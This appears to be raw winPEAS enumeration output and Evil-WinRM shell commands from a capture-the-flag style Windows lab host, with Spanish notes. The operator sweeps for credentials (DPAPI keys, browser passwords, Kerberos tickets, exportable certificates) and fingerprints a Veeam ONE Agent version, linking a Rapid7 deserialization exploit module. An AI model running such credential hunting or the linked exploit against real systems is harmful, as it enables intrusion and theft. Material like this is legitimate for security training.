    LSI Fusion-MPT SAS Driver (StorPort) - 1.34.03.83 [LSI Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sas.sys                                                                                             
    Windows (R) Win 7 DDK driver - 10.0.10011.16384 [LSI Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sas2i.sys                                                                                             
    Windows (R) Win 7 DDK driver - 10.0.10011.16384 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sas3i.sys                                                                                          
    LSI SSS PCIe/Flash Driver (StorPort) - 2.10.61.81 [LSI Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sss.sys                                                                                             
    MEGASAS RAID Controller Driver for Windows - 6.706.06.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\megasas.sys                                                                                   
    MEGASAS RAID Controller Driver for Windows - 6.714.05.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\MegaSas2i.sys                                                                                 
    MEGASAS RAID Controller Driver for Windows - 7.705.08.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\megasas35i.sys                                                                                
    MegaRAID Software RAID - 15.02.2013.0129 [LSI Corporation, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\megasr.sys                                                                                                 
    Marvell Flash Controller -  1.0.5.1016  [Marvell Semiconductor, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\mvumis.sys                                                                                            
    NVIDIA nForce(TM) SATA Driver - 10.6.0.23 [NVIDIA Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\nvstor.sys                                                                                                   
    MEGASAS RAID Controller Driver for Windows - 6.805.03.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\percsas2i.sys                                                                                 
    MEGASAS RAID Controller Driver for Windows - 6.604.06.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\percsas3i.sys                                                                                 
    Microsoftr Windowsr Operating System - 2.60.01 [Silicon Integrated Systems Corp.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\SiSRaid2.sys                                                                              
    Microsoftr Windowsr Operating System - 6.1.6918.0 [Silicon Integrated Systems]: \\.\GLOBALROOT\SystemRoot\System32\drivers\sisraid4.sys                                                                                 
    VIA RAID driver - 7.0.9600,6352 [VIA Technologies Inc.,Ltd]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vsmraid.sys                                                                                                     
    VIA StorX RAID Controller Driver - 8.0.9200.8110 [VIA Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vstxraid.sys                                                                                             
    Chelsio Communications iSCSI Controller - 10.0.10011.16384 [Chelsio Communications]: \\.\GLOBALROOT\SystemRoot\System32\drivers\cht4sx64.sys                                                                            
    Intel(R) Rapid Storage Technology driver (inbox) - 15.44.0.1010 [Intel Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\iaStorAVC.sys                                                                           
    QLogic BR-series FC/FCoE HBA Stor Miniport Driver - 3.2.26.1 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\bfadfcoei.sys                                                                             
    Emulex WS2K12 Storport Miniport Driver x64 - 11.0.247.8000 01/26/2016 WS2K12 64 bit x64 [Emulex]: \\.\GLOBALROOT\SystemRoot\System32\drivers\elxfcoe.sys                                                                
    Emulex WS2K12 Storport Miniport Driver x64 - 11.4.225.8009 11/15/2017 WS2K12 64 bit x64 [Broadcom]: \\.\GLOBALROOT\SystemRoot\System32\drivers\elxstor.sys                                                              
    QLogic iSCSI offload driver - 8.33.5.2 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\qeois.sys                                                                                                       
    QLogic Fibre Channel Stor Miniport Driver - 9.1.15.1 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\ql2300i.sys                                                                                       
    QLA40XX iSCSI Host Bus Adapter - 2.1.5.0 (STOREx wx64) [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\ql40xx2i.sys                                                                                    
    QLogic FCoE Stor Miniport Inbox Driver - 9.1.11.3 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\qlfcoei.sys                                                                                          
    XENVBD - 8.3.1.56 [Amazon Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\xenvbd.sys
    XENCRSH - 8.3.1.56 [Amazon Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\xencrsh.sys
    Amazon NVMe Storage Driver - V1.3.2 [Amazon]: \\.\GLOBALROOT\SystemRoot\System32\drivers\AWSNVMe.sys
    QLogic BR-series FC/FCoE HBA Stor Miniport Driver - 3.2.26.1 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\bfadi.sys                                                                                 
    PMC-Sierra HBA Controller - 1.3.0.10769 [PMC-Sierra]: \\.\GLOBALROOT\SystemRoot\System32\drivers\ADP80XX.SYS                                                                                                            
    Smart Array SAS/SATA Controller Media Driver - 8.0.4.0 Build 1 Media Driver (x86-64) [Hewlett-Packard Company]: \\.\GLOBALROOT\SystemRoot\System32\drivers\HpSAMD.sys
    SmartRAID, SmartHBA PQI Storport Driver - 1.50.0.0 [Microsemi Corportation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\SmartSAMD.sys                                                                                   
    QLogic FCoE offload driver - 8.33.4.2 [Cavium, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\qefcoe.sys                                                                                                             
    QLogic iSCSI offload driver - 7.14.7.2 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\bxois.sys                                                                                                       
    QLogic FCoE Offload driver - 7.14.15.2 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\bxfcoe.sys                                                                                                      
    XENVIF - 8.2.8.27 [Amazon Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\xenvif.sys
    XENIFACE - 8.2.5.39 [Amazon Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\xeniface.sys
    XENNET - 8.2.5.32 [Amazon Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\xennet.sys


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Network Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ Network Shares
  [X] Exception: Access denied 

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerate Network Mapped Drives (WMI)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Host File

ÉÍÍÍÍÍÍÍÍÍÍ¹ Network Ifaces and known hosts
È The masks are only for the IPv4 addresses 
    Ethernet[02:89:25:66:2C:0D]: 10.10.242.97, fe80::385b:3ba3:a213:500a%9 / 255.255.0.0
        Gateways: 10.10.0.1
        DNSs: 10.0.0.2
        Known hosts:
          10.10.0.1             02-C8-85-B5-5A-AA     Dynamic
          10.10.255.255         FF-FF-FF-FF-FF-FF     Static
          172.30.16.1           00-00-00-00-00-00     Invalid
          224.0.0.22            01-00-5E-00-00-16     Static
          224.0.0.251           01-00-5E-00-00-FB     Static
          224.0.0.252           01-00-5E-00-00-FC     Static
          255.255.255.255       FF-FF-FF-FF-FF-FF     Static

    Loopback Pseudo-Interface 1[]: 127.0.0.1, ::1 / 255.0.0.0
        DNSs: fec0:0:0:ffff::1%1, fec0:0:0:ffff::2%1, fec0:0:0:ffff::3%1
        Known hosts:
          224.0.0.22            00-00-00-00-00-00     Static


ÉÍÍÍÍÍÍÍÍÍÍ¹ Current TCP Listening Ports
È Check for services restricted from the outside 
  Enumerating IPv4 connections
                                                                                                              
  Protocol   Local Address         Local Port    Remote Address        Remote Port     State             Process ID      Process Name

  TCP        0.0.0.0               80            0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               135           0.0.0.0               0               Listening         988             svchost
  TCP        0.0.0.0               443           0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               445           0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               2805          0.0.0.0               0               Listening         5060            Veeam.One.Agent.Service
  TCP        0.0.0.0               3389          0.0.0.0               0               Listening         764             svchost
  TCP        0.0.0.0               5985          0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               47001         0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               49664         0.0.0.0               0               Listening         692             wininit
  TCP        0.0.0.0               49665         0.0.0.0               0               Listening         1064            svchost
  TCP        0.0.0.0               49666         0.0.0.0               0               Listening         788             lsass
  TCP        0.0.0.0               49667         0.0.0.0               0               Listening         852             svchost
  TCP        0.0.0.0               49669         0.0.0.0               0               Listening         1340            spoolsv
  TCP        0.0.0.0               49670         0.0.0.0               0               Listening         772             services
  TCP        10.10.242.97          139           0.0.0.0               0               Listening         4               System
  TCP        10.10.242.97          2805          10.10.242.97          49719           Established       5060            Veeam.One.Agent.Service

  Enumerating IPv6 connections
                                                                                                              
  Protocol   Local Address                               Local Port    Remote Address                              Remote Port     State             Process ID      Process Name

  TCP        [::]                                        80            [::]                                        0               Listening         4               System
  TCP        [::]                                        135           [::]                                        0               Listening         988             svchost
  TCP        [::]                                        443           [::]                                        0               Listening         4               System
  TCP        [::]                                        445           [::]                                        0               Listening         4               System
  TCP        [::]                                        3389          [::]                                        0               Listening         764             svchost
  TCP        [::]                                        5985          [::]                                        0               Listening         4               System
  TCP        [::]                                        47001         [::]                                        0               Listening         4               System
  TCP        [::]                                        49664         [::]                                        0               Listening         692             wininit
  TCP        [::]                                        49665         [::]                                        0               Listening         1064            svchost
  TCP        [::]                                        49666         [::]                                        0               Listening         788             lsass
  TCP        [::]                                        49667         [::]                                        0               Listening         852             svchost
  TCP        [::]                                        49669         [::]                                        0               Listening         1340            spoolsv
  TCP        [::]                                        49670         [::]                                        0               Listening         772             services

ÉÍÍÍÍÍÍÍÍÍÍ¹ Current UDP Listening Ports
È Check for services restricted from the outside 
  Enumerating IPv4 connections
                                                                                                              
  Protocol   Local Address         Local Port    Remote Address:Remote Port     Process ID        Process Name

  UDP        0.0.0.0               123           *:*                            2148              svchost
  UDP        0.0.0.0               500           *:*                            852               svchost
  UDP        0.0.0.0               3389          *:*                            764               svchost
  UDP        0.0.0.0               4500          *:*                            852               svchost
  UDP        0.0.0.0               5353          *:*                            1312              svchost
  UDP        0.0.0.0               5355          *:*                            1312              svchost
  UDP        10.10.242.97          137           *:*                            4                 System
  UDP        10.10.242.97          138           *:*                            4                 System
  UDP        127.0.0.1             52950         *:*                            852               svchost

  Enumerating IPv6 connections
                                                                                                              
  Protocol   Local Address                               Local Port    Remote Address:Remote Port     Process ID        Process Name

  UDP        [::]                                        123           *:*                            2148              svchost
  UDP        [::]                                        500           *:*                            852               svchost
  UDP        [::]                                        3389          *:*                            764               svchost
  UDP        [::]                                        4500          *:*                            852               svchost
  UDP        [::]                                        5353          *:*                            1312              svchost
  UDP        [::]                                        5355          *:*                            1312              svchost

ÉÍÍÍÍÍÍÍÍÍÍ¹ Firewall Rules
È Showing only DENY rules (too many ALLOW rules always) 
    Current Profiles: PUBLIC
    FirewallEnabled (Domain):    True
    FirewallEnabled (Private):    True
    FirewallEnabled (Public):    True
    DENY rules:
  [X] Exception: Object reference not set to an instance of an object.

ÉÍÍÍÍÍÍÍÍÍÍ¹ DNS cached --limit 70--
    Entry                                 Name                                  Data
  [X] Exception: Access denied 

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Internet settings, zone and proxy configuration
  General Settings
  Hive        Key                                       Value
  HKCU        DisableCachingOfSSLPages                  1
  HKCU        IE5_UA_Backup_Flag                        5.0
  HKCU        PrivacyAdvanced                           1
  HKCU        SecureProtocols                           2688
  HKCU        User Agent                                Mozilla/4.0 (compatible; MSIE 8.0; Win32)
  HKCU        CertificateRevocation                     1
  HKCU        ZonesSecurityUpgrade                      System.Byte[]
  HKCU        EnableNegotiate                           1
  HKCU        MigrateProxy                              1
  HKCU        ProxyEnable                               0
  HKCU        WarnonZoneCrossing                        1
  HKLM        ActiveXCache                              C:\Windows\Downloaded Program Files
  HKLM        CodeBaseSearchPath                        CODEBASE
  HKLM        EnablePunycode                            1
  HKLM        MinorVersion                              0
  HKLM        WarnOnIntranet                            1

  Zone Maps                                                                                                   
  No URLs configured

  Zone Auth Settings                                                                                          
  No Zone Auth Settings


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Windows Credentials ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking Windows Vault
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-manager-windows-vault                                                                                                       
  [ERROR] Unable to enumerate vaults. Error (0x1061)
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking Credential manager
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-manager-windows-vault                                                                                                       
    [!] Warning: if password contains non-printable characters, it will be printed as unicode base64 encoded string


  [!] Unable to enumerate credentials automatically, error: 'Win32Exception: System.ComponentModel.Win32Exception (0x80004005): A specified logon session does not exist. It may already have been terminated'
Please run:
cmdkey /list

ÉÍÍÍÍÍÍÍÍÍÍ¹ Saved RDP connections
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Remote Desktop Server/Client Settings
  RDP Server Settings
    Network Level Authentication            :
    Block Clipboard Redirection             :
    Block COM Port Redirection              :
    Block Drive Redirection                 :
    Block LPT Port Redirection              :
    Block PnP Device Redirection            :
    Block Printer Redirection               :
    Allow Smart Card Redirection            :

  RDP Client Settings                                                                                         
    Disable Password Saving                 :       True
    Restricted Remote Administration        :       False

ÉÍÍÍÍÍÍÍÍÍÍ¹ Recently run commands
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking for DPAPI Master Keys
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#dpapi
    MasterKey: C:\Users\MichelleWat\AppData\Roaming\Microsoft\Protect\S-1-5-21-2146754214-159084425-2869734154-2014\670e597a-66e1-4e6b-8ec9-ff9e51a7d92e
    Accessed: 6/15/2020 11:12:07 AM
    Modified: 6/15/2020 11:12:07 AM
   =================================================================================================


ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking for DPAPI Credential Files
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#dpapi
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking for RDCMan Settings Files
È Dump credentials from Remote Desktop Connection Manager https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#remote-desktop-credential-manager                                                
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for Kerberos tickets
È  https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88
  [X] Exception: Object reference not set to an instance of an object.
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for saved Wifi credentials
  [X] Exception: Unable to load DLL 'wlanapi.dll': The specified module could not be found. (Exception from HRESULT: 0x8007007E)                                                                                            
Enumerating WLAN using wlanapi.dll failed, trying to enumerate using 'netsh'
No saved Wifi credentials found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking AppCmd.exe
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#appcmd-exe
    AppCmd.exe was found in C:\windows\system32\inetsrv\appcmd.exe
      You must be an administrator to run this check

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking SSClient.exe
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#scclient-sccm
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating SSCM - System Center Configuration Manager settings

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Security Packages Credentials
  [X] Exception: Couldn't parse nt_resp. Len: 0 Message bytes: 4e544c4d5353500003000000010001005e000000000000005f000000000000005800000000000000580000000600060058000000000000005f000000058a80a20a0063450000000fd0d07d1eedade3358b1f3dbc7ca717cf53004500540000                                                                             


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Browsers Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ Showing saved credentials for Firefox
    Info: if no credentials were listed, you might need to close the browser and try again.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for Firefox DBs
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#browsers-history
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for GET credentials in Firefox history
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#browsers-history
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Showing saved credentials for Chrome
    Info: if no credentials were listed, you might need to close the browser and try again.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for Chrome DBs
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#browsers-history
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for GET credentials in Chrome history
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#browsers-history
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Chrome bookmarks
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Showing saved credentials for Opera
    Info: if no credentials were listed, you might need to close the browser and try again.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Showing saved credentials for Brave Browser
    Info: if no credentials were listed, you might need to close the browser and try again.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Showing saved credentials for Internet Explorer (unsupported)
    Info: if no credentials were listed, you might need to close the browser and try again.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Current IE tabs
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#browsers-history
  [X] Exception: System.Reflection.TargetInvocationException: Exception has been thrown by the target of an invocation. ---> System.UnauthorizedAccessException: Access is denied. (Exception from HRESULT: 0x80070005 (E_ACCESSDENIED))                                                                                                  
   --- End of inner exception stack trace ---                                                                 
   at System.RuntimeType.InvokeDispMethod(String name, BindingFlags invokeAttr, Object target, Object[] args, Boolean[] byrefModifiers, Int32 culture, String[] namedParameters)                                            
   at System.RuntimeType.InvokeMember(String name, BindingFlags bindingFlags, Binder binder, Object target, Object[] providedArgs, ParameterModifier[] modifiers, CultureInfo culture, String[] namedParams)                
   at fk.l()                                                                                                  
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for GET credentials in IE history
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#browsers-history

ÉÍÍÍÍÍÍÍÍÍÍ¹ IE favorites
    http://go.microsoft.com/fwlink/p/?LinkId=255142


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Interesting files and registry ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ Putty Sessions
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Putty SSH Host keys
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ SSH keys in registry
È If you find anything here, follow the link to learn how to decrypt the SSH keys https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#ssh-keys-in-registry                                     
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ SuperPutty configuration files

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Office 365 endpoints synced by OneDrive.
                                                                                                              
    SID: S-1-5-19
   =================================================================================================

    SID: S-1-5-20
   =================================================================================================

    SID: S-1-5-21-2146754214-159084425-2869734154-1001
   =================================================================================================

    SID: S-1-5-21-2146754214-159084425-2869734154-2014
   =================================================================================================

    SID: S-1-5-18
   =================================================================================================


ÉÍÍÍÍÍÍÍÍÍÍ¹ Cloud Credentials
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-inside-files
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Unattend Files

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for common SAM & SYSTEM backups

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for McAfee Sitelist.xml Files

ÉÍÍÍÍÍÍÍÍÍÍ¹ Cached GPP Passwords

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for possible regs with creds
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#inside-the-registry
    Not Found
    Not Found
    Not Found
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for possible password files in users homes
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-inside-files
    C:\Users\All Users\Microsoft\UEV\InboxTemplates\RoamingCredentialSettings.xml

ÉÍÍÍÍÍÍÍÍÍÍ¹ Searching for Oracle SQL Developer config files
                                                                                                              

ÉÍÍÍÍÍÍÍÍÍÍ¹ Slack files & directories
  note: check manually if something is found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for LOL Binaries and Scripts (can be slow)
È  https://lolbas-project.github.io/
   [!] Check skipped, if you want to run it, please specify '-lolbas' argument

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Outlook download files
                                                                                                              

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating machine and user certificate files
                                                                                                              
  Issuer             : CN=set.windcorp.thm
  Subject            : CN=set.windcorp.thm
  ValidDate          : 6/7/2020 8:00:22 AM
  ExpiryDate         : 10/7/2036 8:10:21 AM
  HasPrivateKey      : True
  StoreLocation      : LocalMachine
  KeyExportable      : True
  Thumbprint         : 95714370BD9BCC8008EF7D1E0DFCBBC2251CE077

  Enhanced Key Usages
       Client Authentication     [*] Certificate is used for client authentication!
       Server Authentication
   =================================================================================================


ÉÍÍÍÍÍÍÍÍÍÍ¹ Searching known files that can contain creds in home
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-inside-files

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for documents --limit 100--
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Office Most Recent Files -- limit 50
                                                                                                              
  Last Access Date           User                                           Application           Document

ÉÍÍÍÍÍÍÍÍÍÍ¹ Recent files --limit 70--
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking inside the Recycle Bin for creds files
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-inside-files
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Searching hidden files or folders in C:\Users home (can be slow)
                                                                                                              
     C:\Users\Default User
     C:\Users\Default
     C:\Users\All Users

ÉÍÍÍÍÍÍÍÍÍÍ¹ Searching interesting files in other users home directories (can be slow)
                                                                                                              
  [X] Exception: Object reference not set to an instance of an object.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Searching executable files in non-default folders with write (equivalent) permissions (can be slow)                                                                                                            
     File Permissions "C:\Users\MichelleWat\Desktop\winPEASany_ofs.exe": MichelleWat [AllAccess]

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for Linux shells/distributions - wsl.exe, bash.exe


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ File Analysis ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ Found SSH AGENTS Files
File: C:\Users\All Users\Veeam\OneAgent\Packages\Veeam.One.Agent.Package.Powershell.package
File: C:\Users\All Users\Veeam\OneAgent\Packages\Veeam.One.Agent.Package.LogAnalyzer.package
File: C:\Users\All Users\Veeam\OneAgent\Log\3be6b89b-e6de-4e97-bcd4-5c14e9d97fc1\OneAgent.log

*Evil-WinRM* PS C:\Users\MichelleWat\Documents> netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       988
  TCP    0.0.0.0:443            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:2805           0.0.0.0:0              LISTENING       5060
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       764
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       692
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       1064
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       788
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       852
  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       1340
  TCP    0.0.0.0:49670          0.0.0.0:0              LISTENING       772
  TCP    10.10.242.97:139       0.0.0.0:0              LISTENING       4
  TCP    10.10.242.97:2805      10.10.242.97:49719     ESTABLISHED     5060
  TCP    10.10.242.97:5985      10.8.19.103:53348      TIME_WAIT       0
  TCP    10.10.242.97:5985      10.8.19.103:53364      ESTABLISHED     4
  TCP    10.10.242.97:49719     10.10.242.97:2805      ESTABLISHED     5060


*Evil-WinRM* PS C:\Users\MichelleWat\Documents> Get-Process -Id 5060

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    744      53    54720      74028              5060   0 Veeam.One.Agent.Service


Veeam One Agent Service es un servicio de Windows que forma parte de la solución de backup y recuperación de datos de Veeam. Su función es recopilar información sobre el estado de los servidores y dispositivos de almacenamiento en un entorno de TI y enviar esa información a Veeam ONE Server para su análisis. Esto permite a los administradores de TI monitorear el estado de sus servidores y dispositivos de almacenamiento y tomar medidas preventivas para evitar problemas de disponibilidad.

El servicio Veeam One Agent Service se inicia automáticamente cada vez que se inicia la computadora y se ejecuta en segundo plano, sin interferir con el rendimiento del sistema. Si necesitas detener el servicio, puedes hacerlo desde el Administrador de tareas de Windows o desde el panel de control de Veeam ONE.

https://www.veeam.com/

https://www.veeam.com/kb3144

https://www.rapid7.com/db/modules/exploit/windows/misc/veeam_one_agent_deserialization/

*Evil-WinRM* PS C:\Users\MichelleWat\Documents> Get-ChildItem C:\ -recurse -ErrorAction SilentlyContinue | Where-Object {$_.Name -match "Veeam.One.Agent"}


    Directory: C:\Program Files\Veeam\Veeam ONE


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         6/7/2020   7:57 AM                Veeam ONE Agent


    Directory: C:\Program Files\Veeam\Veeam ONE\Veeam ONE Agent


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        1/18/2019   7:50 PM         453560 Veeam.One.Agent.Common.dll
-a----        1/18/2019   7:50 PM          22968 Veeam.One.Agent.Configurator.PowerShell.dll
-a----        1/18/2019   7:50 PM          57784 Veeam.One.Agent.Controller.PowerShell.dll
-a----        1/18/2019   7:50 PM          89528 Veeam.One.Agent.Deployment.Common.dll
-a----        1/18/2019   7:50 PM         445880 Veeam.One.Agent.Deployment.Service.exe
-a----        1/18/2019   7:50 PM         311736 Veeam.One.Agent.Service.exe
-a----        1/18/2019   7:50 PM          50616 Veeam.One.Agent.Updater.exe


Evil-WinRM* PS C:\Users\MichelleWat\Documents> Get-Item 'C:\Program Files\Veeam\Veeam ONE\Veeam ONE Agent\Veeam.One.Agent.Service.exe' | Format-List *


PSPath            : Microsoft.PowerShell.Core\FileSystem::C:\Program Files\Veeam\Veeam ONE\Veeam ONE Agent\Veeam.One.Agent.Service.exe
PSParentPath      : Microsoft.PowerShell.Core\FileSystem::C:\Program Files\Veeam\Veeam ONE\Veeam ONE Agent
PSChildName       : Veeam.One.Agent.Service.exe
PSDrive           : C
PSProvider        : Microsoft.PowerShell.Core\FileSystem
PSIsContainer     : False
Mode              : -a----
VersionInfo       : File:             C:\Program Files\Veeam\Veeam ONE\Veeam ONE Agent\Veeam.One.Agent.Service.exe
                    InternalName:     Veeam.One.Agent.Service.exe
                    OriginalFilename: Veeam.One.Agent.Service.exe
                    FileVersion:      9.5.4.4566
                    FileDescription:  OneAgent
                    Product:          Veeam ONE Monitor
                    ProductVersion:   9.5.4.4566
                    Debug:            False
                    Patched:          False
                    PreRelease:       False
                    PrivateBuild:     False
                    SpecialBuild:     False
                    Language:         Language Neutral

BaseName          : Veeam.One.Agent.Service
Target            : {}
LinkType          :
Name              : Veeam.One.Agent.Service.exe
Length            : 311736
DirectoryName     : C:\Program Files\Veeam\Veeam ONE\Veeam ONE Agent
Directory         : C:\Program Files\Veeam\Veeam ONE\Veeam ONE Agent
IsReadOnly        : False
Exists            : True
FullName          : C:\Program Files\Veeam\Veeam ONE\Veeam ONE Agent\Veeam.One.Agent.Service.exe
Extension         : .exe
CreationTime      : 1/18/2019 7:50:50 PM
CreationTimeUtc   : 1/19/2019 3:50:50 AM
LastAccessTime    : 6/7/2020 7:57:03 AM
LastAccessTimeUtc : 6/7/2020 2:57:03 PM
LastWriteTime     : 1/18/2019 7:50:50 PM
